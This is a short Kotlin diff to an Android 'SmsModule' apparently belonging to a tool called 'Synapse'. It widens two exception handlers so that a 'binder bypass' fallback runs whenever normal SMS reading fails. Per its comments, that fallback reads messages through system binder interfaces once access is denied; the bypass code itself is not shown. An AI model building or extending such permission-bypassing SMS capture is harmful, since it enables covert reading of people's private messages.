@@ -265,7 +265,7 @@ object SmsModule {
                     ))
                 }
             }
-        } catch (e: SecurityException) {
+        } catch (e: Exception) {
             // ── Binder bypass fallback ──
             Log.d("Synapse.SMS", "Capture: ContentResolver denied, trying binder bypass...")
             return try {
@@ -360,7 +360,7 @@ object SmsModule {
                 messages = messages,
                 count = messages.size
             )
-        } catch (e: SecurityException) {
+        } catch (e: Exception) {
             // ── Binder bypass fallback: use ISmsService / IContentProvider directly ──
             Log.d("Synapse.SMS", "ContentResolver denied, trying binder bypass...")
             return try {
